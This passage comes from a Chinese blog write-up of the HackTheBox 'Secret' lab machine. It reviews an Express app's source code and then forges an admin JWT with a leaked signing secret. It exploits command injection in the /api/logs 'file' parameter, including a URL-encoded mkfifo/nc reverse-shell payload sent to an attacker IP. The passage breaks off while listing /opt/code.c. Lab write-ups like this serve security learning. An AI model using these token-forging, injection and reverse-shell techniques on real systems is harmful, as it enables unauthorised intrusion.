<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说，这是一个难度适中的靶机，相信一开始获取snmp突破口那里已经死了一大部分人了，然后就是后面sql注入成功后但是却没法解密，所以这个靶机相当出色，比较考验漏洞复现的技能。</p>
]]></content>
      <categories>
        <category>CMS</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Secret</title>
    <url>/2022/01/18/Secret/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现目标主机开放了web服务和ssh服务<br><img src="https://img-blog.csdnimg.cn/bcfdfdf3f8f34f54b9cef39a2bfd9e87.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们访问web服务，发现是一个普通的网站<br><img src="https://img-blog.csdnimg.cn/ebaa1c867d244570a8bbaee74355eb78.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>探测路径并没有发现任何有价值的信息，我们将源码下载下来进行代码审计。在routes文件夹下，有4个js文件<br><img src="https://img-blog.csdnimg.cn/9819cf6cb2214d76bce1c74ff577d39e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们查看一下auth.js文件</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>).Router();</span><br><span class="line"><span class="keyword">const</span> User = <span class="built_in">require</span>(<span class="string">&#x27;../model/user&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bcrypt = <span class="built_in">require</span>(<span class="string">&#x27;bcryptjs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; registerValidation, loginValidation&#125; = <span class="built_in">require</span>(<span class="string">&#x27;../validations&#x27;</span>)</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/register&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// validation</span></span><br><span class="line">    <span class="keyword">const</span> &#123; error &#125; = registerValidation(req.body)</span><br><span class="line">    <span class="keyword">if</span> (error) <span class="keyword">return</span> res.status(<span class="number">400</span>).send(error.details[<span class="number">0</span>].message);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if user exists</span></span><br><span class="line">    <span class="keyword">const</span> emailExist = <span class="keyword">await</span> User.findOne(&#123;<span class="attr">email</span>:req.body.email&#125;)</span><br><span class="line">    <span class="keyword">if</span> (emailExist) <span class="keyword">return</span> res.status(<span class="number">400</span>).send(<span class="string">&#x27;Email already Exist&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if user name exist </span></span><br><span class="line">    <span class="keyword">const</span> unameexist = <span class="keyword">await</span> User.findOne(&#123; <span class="attr">name</span>: req.body.name &#125;)</span><br><span class="line">    <span class="keyword">if</span> (unameexist) <span class="keyword">return</span> res.status(<span class="number">400</span>).send(<span class="string">&#x27;Name already Exist&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">//hash the password</span></span><br><span class="line">    <span class="keyword">const</span> salt = <span class="keyword">await</span> bcrypt.genSalt(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">const</span> hashPaswrod = <span class="keyword">await</span> bcrypt.hash(req.body.password, salt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//create a user </span></span><br><span class="line">    <span class="keyword">const</span> user = <span class="keyword">new</span> User(&#123;</span><br><span class="line">        name: req.body.name,</span><br><span class="line">        email: req.body.email,</span><br><span class="line">        password:hashPaswrod</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">const</span> saveduser = <span class="keyword">await</span> user.save();</span><br><span class="line">        res.send(&#123; <span class="attr">user</span>: user.name&#125;)</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// login </span></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">async</span>  (req , res) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> &#123; error &#125; = loginValidation(req.body)</span><br><span class="line">    <span class="keyword">if</span> (error) <span class="keyword">return</span> res.status(<span class="number">400</span>).send(error.details[<span class="number">0</span>].message);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if email is okay </span></span><br><span class="line">    <span class="keyword">const</span> user = <span class="keyword">await</span> User.findOne(&#123; <span class="attr">email</span>: req.body.email &#125;)</span><br><span class="line">    <span class="keyword">if</span> (!user) <span class="keyword">return</span> res.status(<span class="number">400</span>).send(<span class="string">&#x27;Email is wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check password </span></span><br><span class="line">    <span class="keyword">const</span> validPass = <span class="keyword">await</span> bcrypt.compare(req.body.password, user.password)</span><br><span class="line">    <span class="keyword">if</span> (!validPass) <span class="keyword">return</span> res.status(<span class="number">400</span>).send(<span class="string">&#x27;Password is wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// create jwt </span></span><br><span class="line">    <span class="keyword">const</span> token = jwt.sign(&#123; <span class="attr">_id</span>: user.id, <span class="attr">name</span>: user.name , <span class="attr">email</span>: user.email&#125;, process.env.TOKEN_SECRET )</span><br><span class="line">    res.header(<span class="string">&#x27;auth-token&#x27;</span>, token).send(token);</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.use(<span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    res.json(&#123;</span><br><span class="line">        message: &#123;</span><br><span class="line"></span><br><span class="line">            message: <span class="string">&quot;404 page not found&quot;</span>,</span><br><span class="line">            desc: <span class="string">&quot;page you are looking for is not found. &quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router</span><br></pre></td></tr></table></figure>
<!--more-->

<p>看到源代码后，不难理解其逻辑，程序的逻辑就是先要注册用户，并检查邮件和用户名是否存在，并将密码进行加密。然后程序跳转到登录页面，登录页面查看用户输入的邮件名和密码是否正确，并生成一个jwt的token值发送给用户。</p>
<p>auth.js文件的逻辑理解完之后，我们再审计<code>private.js</code>这个js文件，这个文件是去判断我们当前用户是否是管理员，如果是管理员，那么就返回一个属于管理员的token值给我们。logs目录的作用我们后面在阐述。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>).Router();</span><br><span class="line"><span class="keyword">const</span> verifytoken = <span class="built_in">require</span>(<span class="string">&#x27;./verifytoken&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> User = <span class="built_in">require</span>(<span class="string">&#x27;../model/user&#x27;</span>);</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/priv&#x27;</span>, verifytoken, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">   <span class="comment">// res.send(req.user)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> userinfo = &#123; <span class="attr">name</span>: req.user &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> name = userinfo.name.name;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;theadmin&#x27;</span>)&#123;</span><br><span class="line">        res.json(&#123;</span><br><span class="line">            creds:&#123;</span><br><span class="line">                role:<span class="string">&quot;admin&quot;</span>, </span><br><span class="line">                username:<span class="string">&quot;theadmin&quot;</span>,</span><br><span class="line">                desc : <span class="string">&quot;welcome back admin,&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.json(&#123;</span><br><span class="line">            role: &#123;</span><br><span class="line">                role: <span class="string">&quot;you are normal user&quot;</span>,</span><br><span class="line">                desc: userinfo.name.name</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/logs&#x27;</span>, verifytoken, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> file = req.query.file;</span><br><span class="line">    <span class="keyword">const</span> userinfo = &#123; <span class="attr">name</span>: req.user &#125;</span><br><span class="line">    <span class="keyword">const</span> name = userinfo.name.name;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;theadmin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> getLogs = <span class="string">`git log --oneline <span class="subst">$&#123;file&#125;</span>`</span>;</span><br><span class="line">        exec(getLogs, <span class="function">(<span class="params">err , output</span>) =&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(err)&#123;</span><br><span class="line">                res.status(<span class="number">500</span>).send(err);</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            res.json(output);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.json(&#123;</span><br><span class="line">            role: &#123;</span><br><span class="line">                role: <span class="string">&quot;you are normal user&quot;</span>,</span><br><span class="line">                desc: userinfo.name.name</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.use(<span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    res.json(&#123;</span><br><span class="line">        message: &#123;</span><br><span class="line"></span><br><span class="line">            message: <span class="string">&quot;404 page not found&quot;</span>,</span><br><span class="line">            desc: <span class="string">&quot;page you are looking for is not found. &quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>那么我们可以先跟着程序的逻辑走，先注册一个用户，我们使用curl命令进行注册</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X POST -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> -v http://secret.htb/api/user/register --data <span class="string">&#x27;&#123;&quot;name&quot;: &quot;pyhpyh&quot;,&quot;email&quot;:&quot;pyhpyh@pyhpyh.com&quot;,&quot;password&quot;:&quot;123456&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/6877b34ccd48456899c6406694b4a3c1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>注册成功后我们尝试登录，获取到对应的一个jwt的json值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X POST -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> -v http://secret.htb/api/user/login --data <span class="string">&#x27;&#123;&quot;email&quot;: &quot;pyhpyh@pyhpyh.com&quot;,&quot;password&quot;:&quot;123456&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/aafa956f479941fbbeab98630d01d38f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们拿到<code>jwt.io</code>这个网站上进行解密，可以看到如下的信息<br><img src="https://img-blog.csdnimg.cn/179ef353a19343508cdd7f441865168d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们以这个token值去请求<code>priv</code>页面时，页面返回的是json内容给我们，表名我们当前还是一个普通用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://secret.htb/api/priv -H <span class="string">&#x27;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWU1OTEwNTQ4OTBkMzA0NWZiZGVjZTkiLCJuYW1lIjoicHlocHloIiwiZW1haWwiOiJweWhweWhAcHlocHloLmNvbSIsImlhdCI6MTY0MjQzNDk3MX0.a0IawKMSfT6K0c3MnpLFUG9DdzBGETBaBidIVvI232k&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/4ffd7b07f06341bc9e474824e0ab7497.png" alt="在这里插入图片描述"><br>那么我们这里就可以使用越权的方式进行对我们当前用户的权限进行提升。首先我们先获取到网站本身对应的<code>TOKEN_SECRET</code>值<code>gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE</code><br><img src="https://img-blog.csdnimg.cn/fbbb692d50744c04b07e88f1794b5a28.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这里有两种方式可以获取到<code>theadmin</code>的token值，第一种方式是直接在jwt.io网站上获取，另一种是借助github上的开源工具，两种方法都是可行的。<br><img src="https://img-blog.csdnimg.cn/8d4fa1ca097b4af88ba2fa45fb58e16f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/7e6f80cc46fb4cd295778db414ecac66.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>token改变完成后，我们再进行请求，验证我们的token是否有效，结果是成功的。<br><img src="https://img-blog.csdnimg.cn/a1f94aca92f3429c9a9f6a60702f9b5f.png" alt="在这里插入图片描述"><br>第二种方法就是，利用jwt_tools这个工具直接生成一个有效的theadmin对应的token值。<code>-I</code>参数是指更改现有的jwt_token值，<code>-S</code>是指加密的方式，<code>-pc</code>是设置payload的对应字段名，<code>-pv</code>是payload对应的字段值，<code>-p</code>是指密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 jwt_tool.py -I -S hs256 -pc <span class="string">&#x27;name&#x27;</span> -pv <span class="string">&#x27;theadmin&#x27;</span> -p <span class="string">&#x27;gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE&#x27;</span> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWU2MmM4MjJiODI1ZTA0NmIwNzFiYTIiLCJuYW1lIjoicHlocHloIiwiZW1haWwiOiJweWhweWhAcHlocHloLmNvbSIsImlhdCI6MTY0MjQ3NDY0Mn0.veoEcejKaj-TjQuBu63pwJmyaU1hzx3qV7GgQkbZ6R4</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/84147fa8af0e48feb62f092514fda485.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>至此，我们虽然是得到了admin的token令牌，但是我们还得找到可以利用的点。在审计private.js文件时，发现了logs目录，这个目录后面要传入一个files参数，这个参数执行的条件恰巧就是必须得以管理员的权限运行，并且是以命令的形式执行，那这里就可能存在RCE漏洞了。我们简单检验了一下<br><img src="https://img-blog.csdnimg.cn/3986f4c8d6c741c3a586b085150d2916.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_19,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://secret.htb/api/logs?file=/etc/passwd&#x27;</span> -H <span class="string">&#x27;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWU2MmM4MjJiODI1ZTA0NmIwNzFiYTIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InB5aHB5aEBweWhweWguY29tIiwiaWF0IjoxNjQyNDc0NjQyfQ.C-80kPcZ5PSO1qK-VNL1m4PACDJO8jJ-qPMrTp19u_A&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2227afbf6fb649e681f1a9da5e9bd06c.png" alt="在这里插入图片描述"><br>从这个现象上看，有点类似于命令注入漏洞。我们稍微更改一下参数变量的值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://secret.htb/api/logs?file=;id&#x27;</span> -H <span class="string">&#x27;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWU2MmM4MjJiODI1ZTA0NmIwNzFiYTIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InB5aHB5aEBweWhweWguY29tIiwiaWF0IjoxNjQyNDc0NjQyfQ.C-80kPcZ5PSO1qK-VNL1m4PACDJO8jJ-qPMrTp19u_A&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/39cd1b3ae0744ea783b6dfe4775a5e43.png" alt="在这里插入图片描述"><br>那我们就可以反弹一个shell到本地终端上了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://secret.htb/api/logs?file=;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%20%7C%20%2Fbin%2Fsh%20-i%202%3E%261%20%7C%20nc%2010.10.14.26%204444%20%3E%2Ftmp%2Ff&#x27;</span> -H <span class="string">&#x27;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWU2MmM4MjJiODI1ZTA0NmIwNzFiYTIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InB5aHB5aEBweWhweWguY29tIiwiaWF0IjoxNjQyNDc0NjQyfQ.C-80kPcZ5PSO1qK-VNL1m4PACDJO8jJ-qPMrTp19u_A&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/91a92e66d3d8430b83ab8c3b7f961162.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/22ae641b17d34a9eaab0ac356d0e3032.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们首先查找具有执行权限的文件，引起我注意的是<code>/opt/count</code>这个文件<br><img src="https://img-blog.csdnimg.cn/e850dd03ff7d47fbb92504de53f3bfc7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>进入opt目录后，发现存在一个<code>code.c</code>文件<br><img src="https://img-blog.csdnimg.cn/1148c32238e347d6a410e8666df9bb43.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dircount</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">char</span> *summary)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DIR *dir;</span><br><span class="line">    <span class="keyword">char</span> fullpath[PATH_MAX];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">ent</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">fstat</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> tot = <span class="number">0</span>, regular_files = <span class="number">0</span>, directories = <span class="number">0</span>, symlinks = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((dir = opendir(path)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nUnable to open directory.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((ent = readdir(dir)) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ++tot;</span><br><span class="line">        <span class="built_in">strncpy</span>(fullpath, path, PATH_MAX-NAME_MAX<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(fullpath, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="built_in">strncat</span>(fullpath, ent-&gt;d_name, <span class="built_in">strlen</span>(ent-&gt;d_name));</span><br><span class="line">        <span class="keyword">if</span> (!lstat(fullpath, &amp;fstat))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(S_ISDIR(fstat.st_mode))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">                ++directories;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(S_ISLNK(fstat.st_mode))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;l&quot;</span>);</span><br><span class="line">                ++symlinks;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(S_ISREG(fstat.st_mode))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                ++regular_files;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IRUSR) ? <span class="string">&quot;r&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IWUSR) ? <span class="string">&quot;w&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IXUSR) ? <span class="string">&quot;x&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IRGRP) ? <span class="string">&quot;r&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IWGRP) ? <span class="string">&quot;w&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IXGRP) ? <span class="string">&quot;x&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IROTH) ? <span class="string">&quot;r&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IWOTH) ? <span class="string">&quot;w&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IXOTH) ? <span class="string">&quot;x&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;??????????&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;\t%s\n&quot;</span>, ent-&gt;d_name);</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(dir);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">snprintf</span>(summary, <span class="number">4096</span>, <span class="string">&quot;Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n&quot;</span>, tot, regular_files, directories, symlinks);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s&quot;</span>, summary);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">filecount</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">char</span> *summary)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *file;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">int</span> characters, words, lines;</span><br><span class="line"></span><br><span class="line">    file = fopen(path, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nUnable to open file.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please check if file exists and you have read privilege.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    characters = words = lines = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((ch = fgetc(file)) != EOF)</span><br><span class="line">    &#123;</span><br><span class="line">        characters++;</span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">&#x27;\n&#x27;</span> || ch == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">            lines++;</span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">&#x27; &#x27;</span> || ch == <span class="string">&#x27;\t&#x27;</span> || ch == <span class="string">&#x27;\n&#x27;</span> || ch == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">            words++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (characters &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        words++;</span><br><span class="line">        lines++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">snprintf</span>(summary, <span class="number">256</span>, <span class="string">&quot;Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n&quot;</span>, characters, words, lines);</span><br><span class="line">    <span class="built_in">printf</span>(<span 